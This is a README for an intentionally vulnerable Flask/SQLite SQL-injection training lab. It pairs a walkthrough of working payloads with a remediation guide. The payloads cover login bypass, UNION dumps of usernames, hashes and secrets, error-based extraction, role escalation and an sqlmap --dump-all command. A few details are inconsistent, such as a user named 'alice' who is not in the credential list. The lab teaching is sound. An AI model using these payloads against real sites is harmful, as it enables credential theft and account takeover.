# 🎓 SQL Injection (SQLi) Vulnerability Lab & Remediation Guide

> **Educational Project** — A deliberately vulnerable Flask + SQLite web application built to demonstrate manual SQL Injection exploitation end-to-end and to teach secure coding through remediation.

![Python](https://img.shields.io/badge/Python-3.10+-blue)
![Flask](https://img.shields.io/badge/Flask-3.0.3-green)
![SQLite](https://img.shields.io/badge/Database-SQLite-lightgrey)
![Status](https://img.shields.io/badge/Status-Educational%20Only-red)
![License](https://img.shields.io/badge/License-MIT-yellow)

---

## ⚠️ Legal & Ethical Disclaimer

This project is **intentionally insecure**. It is built **only** for:

- Personal cybersecurity training
- CTF / OSCP-style practice
- Classroom demonstrations
- Secure coding workshops

🚫 **Do NOT** deploy this application on any public server, shared host, or production environment.  
🚫 **Do NOT** use these techniques against systems you do not own or have written permission to test.

Run it **only** on `127.0.0.1` or an isolated VM with no internet exposure.  
Unauthorized use of SQL injection against real systems is illegal under cybercrime laws worldwide (e.g., PECA in Pakistan, CFAA in the US, Computer Misuse Act in the UK).

---

## 📌 Project Overview

**Title:** SQL Injection (SQLi) Vulnerability Lab & Remediation Guide

**Description:**  
A local **Python/Flask** web application designed to demonstrate **web application security testing**, **manual exploitation techniques**, and **secure coding practices**.

The lab simulates a **Student Portal** (mini e-commerce style) with the following intentionally vulnerable features:

| Feature | Vulnerability | Impact |
|---|---|---|
| Login form | Authentication Bypass | Full account takeover |
| Product search | UNION-based SQLi | Database dump |
| Order history | Integer parameter injection | Credential leak |
| Admin panel | Privilege escalation + SQLi | Flag capture / secrets leak |

**Learning Outcomes:**
- Understand how SQL injection occurs in real code
- Perform manual PoC exploitation (bypass → dump → escalate)
- Automate with `sqlmap`
- Learn the fix using **parameterized queries**, **strong hashing**, and **safe config**

---

## 🧱 Tech Stack & Lab Environment

| Component | Version |
|---|---|
| Language | Python 3.10+ |
| Framework | Flask 3.0.3 |
| Database | SQLite 3 |
| Frontend | HTML5 / CSS3 (Jinja2 templates) |
| OS Tested | Linux / macOS / Windows (WSL) |

**Local URL:** http://127.0.0.1:5000

---

## 📁 Repository Structure

```
sqli-lab/
├── app.py                  # Vulnerable Flask application
├── init_db.py              # Database setup script
├── requirements.txt        # Python dependencies
├── sqli_lab.db             # SQLite DB (generated)
├── templates/
│   ├── base.html
│   ├── login.html
│   ├── search.html
│   ├── orders.html
│   ├── profile.html
│   └── admin.html
└── README.md
```

---

## ⚙️ Step-by-Step Setup Guide

### 1. Clone the repository

```bash
git clone https://github.com/<nayabnoorsmn>/sqli-lab.git
cd sqli-lab
```

### 2. Create a virtual environment

```bash
python3 -m venv venv
source venv/bin/activate        # Linux/macOS
# venv\Scripts\activate         # Windows
```

### 3. Install dependencies

```bash
pip install -r requirements.txt
```

### 4. Initialize the database

```bash
python init_db.py
# Output: [+] Database created: sqli_lab.db
```

### 5. Run the application (localhost only!)

```bash
python app.py
```

### 6. Open in browser

```
http://127.0.0.1:5000
```

**Default test credentials:**

| Username | Password | Role |
|---|---|---|
| amna | password123 | student |
| hamza | qwerty | student |
| ibrahim | letmein | student |
| admin | S3cr3tAdm1n! | admin |

> Passwords are stored as SHA-256 hashes (intentionally weak — for demo only).

---

## 🗄️ Database Schema

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT,          -- SHA-256 hash (weak for demo)
    role TEXT DEFAULT 'student',
    email TEXT
);

CREATE TABLE products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT, price REAL, stock INTEGER
);

CREATE TABLE orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER, product_id INTEGER, qty INTEGER, note TEXT
);

CREATE TABLE secrets (
    id INTEGER PRIMARY KEY, key TEXT, value TEXT
);
```

---

## 🧪 Exploitation Walkthrough (Proof of Concept)

### 🔓 1. Authentication Bypass

**Target:** `/login`

**Payload (Username field):**
```
admin' --
```
**Password:** anything (e.g., `x`)

**Resulting SQL:**
```sql
SELECT id, username, role FROM users
WHERE username='admin' --' AND password='x'
```

**Outcome:** The `--` comment truncates the password check, allowing login as the `admin` user without knowing the password.

**Alternative bypass (no username needed):**
```text
username: ' OR '1'='1' LIMIT 1 --
password: x
```

✅ **Proof:** Session now holds `role=admin` → access to `/admin` panel.

---

### 🗃️ 2. Data Extraction — UNION-based SQLi

**Target:** `/search`

**Payload 1 — Dump all users:**
```sql
' UNION SELECT id, username, password FROM users --
```

**Resulting SQL:**
```sql
SELECT id, name, price FROM products WHERE name LIKE '%' 
UNION SELECT id, username, password FROM users --%'
```

**Outcome:** The product table now displays every username and password hash.

**Payload 2 — Dump emails:**
```sql
' UNION SELECT id, username, email FROM users --
```

**Payload 3 — Enumerate schema:**
```sql
' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table' --
```

**Payload 4 — Dump `secrets` table directly:**
```sql
' UNION SELECT id, key, value FROM secrets --
```

**Outcome:** Leaks `FLAG_ADMIN` and `DB_BACKUP_KEY`.

**Verify cracked hash offline:**
```bash
echo -n "S3cr3tAdm1n!" | sha256sum
```

---

### 🧠 3. Error-Based Extraction

**Target:** `/search`

**Payload — leak admin password via type error:**
```sql
' AND CAST((SELECT password FROM users WHERE username='admin') AS INTEGER) --
```

**Outcome:** SQLite error message leaks the password hash directly in the response.

---

### 🧨 4. Second-Order Injection via Order History

**Target:** `/orders`

**Payload:**
```
/orders?uid=1 UNION SELECT 1, username, 1, password FROM users --
```

**Outcome:** Admin credentials leaked even while logged in as a low-privileged student.

---

### 👑 5. Privilege Escalation & Flag Capture

**Path A — Direct Admin Access (fastest):**
1. Login with `admin' --` bypass.
2. Visit `/admin?key=FLAG_ADMIN`.
3. 🚩 **Flag captured:** `FLAG{sqli_to_admin_pwn3d}`

**Path B — Stored / Persistent Escalation (optional endpoint):**

If `/profile/update` is enabled, submit:
```
email = x', role='admin' WHERE id=1 --
```

**Resulting SQL:**
```sql
UPDATE users SET email='x', role='admin' WHERE id=1 --' WHERE id=1
```

**Outcome:** User `id=1` (alice) is promoted to `admin`. Re-login → full admin control.

---

### 🤖 6. Full Database Takeover with `sqlmap`

```bash
sqlmap -u "http://127.0.0.1:5000/search?q=test" \
       --cookie="session=<your-session-cookie>" \
       --dbms=sqlite --batch --dump-all
```

**Result:** Complete dump of `users`, `products`, `orders`, and `secrets` tables saved to `~/.local/share/sqlmap/output/`.

> **Full database takeover in a single request (manual alternative):**
> ```sql
> ' UNION SELECT 1, group_concat(username||':'||password||':'||role), 3 FROM users --
> ```

---

## 🩺 Vulnerability Root Cause

The root cause is **lack of input sanitization** and **absence of parameterized queries** across all endpoints.  

Every SQL query was built using **raw string concatenation**, for example:

```python
# ❌ VULNERABLE
q = f"SELECT id, username, role FROM users WHERE username='{u}' AND password='{p}'"
db().execute(q)
```

Because user input was inserted **directly into the SQL string**, attackers could:

- Terminate the original query (`'`)
- Inject additional logic (`OR 1=1`, `UNION SELECT`)
- Comment out the rest of the query (`--`)
- Read, modify, or escalate privileges in the database

**Additional weak points:**

- Passwords hashed with **SHA-256** (no salt, no KDF) → fast to crack
- `debug=True` in Flask → reveals stack traces and SQL errors
- Session `role` stored client-side without server validation
- `uid` parameter in `/orders` taken from user input instead of session

---

## 🛡️ Remediation & Secure Coding (The Fix)

### ✅ 1. Parameterized Queries (Prepared Statements)

Replace string concatenation with parameter binding — **the single most important fix**.

```python
# ✅ SECURE — Login
row = db().execute(
    "SELECT id, username, role FROM users WHERE username=? AND password=?",
    (u, sha256(p).hexdigest())
).fetchone()

# ✅ SECURE — Search
db().execute(
    "SELECT id, name, price FROM products WHERE name LIKE ?",
    (f"%{term}%",)
)

# ✅ SECURE — Orders (coerce to int, then bind)
uid_int = int(uid)
db().execute(
    "SELECT o.id, p.name, o.qty, o.note FROM orders o "
    "JOIN products p ON p.id=o.product_id WHERE o.user_id = ?",
    (uid_int,)
)

# ✅ SECURE — Admin key lookup
db().execute(
    "SELECT value FROM secrets WHERE key = ?",
    (key,)
)
```

### ✅ 2. Strong Password Hashing

Never use raw SHA-256 or MD5 for passwords. Use a slow, salted KDF:

```python
from werkzeug.security import generate_password_hash, check_password_hash

hashed = generate_password_hash("password123", method="argon2")
if check_password_hash(hashed, user_input):
    ...
```

Or use `bcrypt` / `argon2-cffi` directly.

### ✅ 3. Debug Configuration

```python
# ❌ NEVER in production
app.run(host="127.0.0.1", port=5000, debug=True)

# ✅ SAFE
app.run(host="127.0.0.1", port=5000, debug=False)
```

Additionally:

- Do not expose `werkzeug` debugger
- Sanitize all error messages shown to users
- Log detailed errors server-side only

### ✅ 4. Least Privilege for DB Account

Create a dedicated SQLite/MySQL user with only required `SELECT/INSERT/UPDATE` permissions — **never** `DROP`, `ALTER`, or cross-schema access.

### ✅ 5. Defense in Depth

- Input validation (allowlists where possible — e.g., `uid` must be integer)
- Server-side session validation of `role` (re-query DB, don't trust cookie)
- Web Application Firewall (WAF) as **secondary** defense only
- ORM usage with bound params (e.g., SQLAlchemy `text().bindparams(...)`)
- Regular security testing (SAST/DAST + code review)

---

## ✅ Verification Checklist

- [x] `python init_db.py` creates `sqli_lab.db`
- [x] `amna/password123` logs in as student
- [x] `admin' --` / `x` logs in as admin
- [x] Search UNION payload dumps all users
- [x] `/orders?uid=1 UNION SELECT ...` leaks admin hash
- [x] `/admin?key=FLAG_ADMIN` returns flag when admin
- [x] `sqlmap --dump-all` completes full takeover

---

## 🎯 Learning Objectives Achieved

| Objective | Status |
|---|---|
| Understand SQLi root causes in real code | ✅ |
| Perform authentication bypass | ✅ |
| Perform UNION-based data extraction | ✅ |
| Escalate privileges to admin | ✅ |
| Dump full database with `sqlmap` | ✅ |
| Apply secure coding fixes | ✅ |
| Document findings like a professional pentest report | ✅ |

---

## 🧾 Suggested Fix Commit (for students)

Try opening a PR that:

1. Replaces every `f"..."` SQL string with `?` placeholders  
2. Swaps SHA-256 for `werkzeug.security.generate_password_hash`  
3. Sets `debug=False`  
4. Adds server-side `role` verification  
5. Adds `tests/test_sqli.py` with `sqlmap` regression checks

---

## 📚 References

- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — SQLi](https://portswigger.net/web-security/sql-injection)
- [sqlmap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [Flask Security Best Practices](https://flask.palletsprojects.com/en/latest/security/)

---

## 👩‍💻 Author

**Prepared by:** *Nayab Noor*  
**Role:** Cybersecurity Enthusiast / AppSec Learner  
**Purpose:** Educational Lab — Portfolio Project  

---

## 📄 License

MIT License — for **educational use only**.  
The author is **not responsible** for any misuse or illegal activity performed with this code.

```
MIT License

Copyright (c) 2026 Nayab Noor

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

> 🔐 **Remember:** *The goal of this lab is not to break systems — it is to learn how to protect them.*
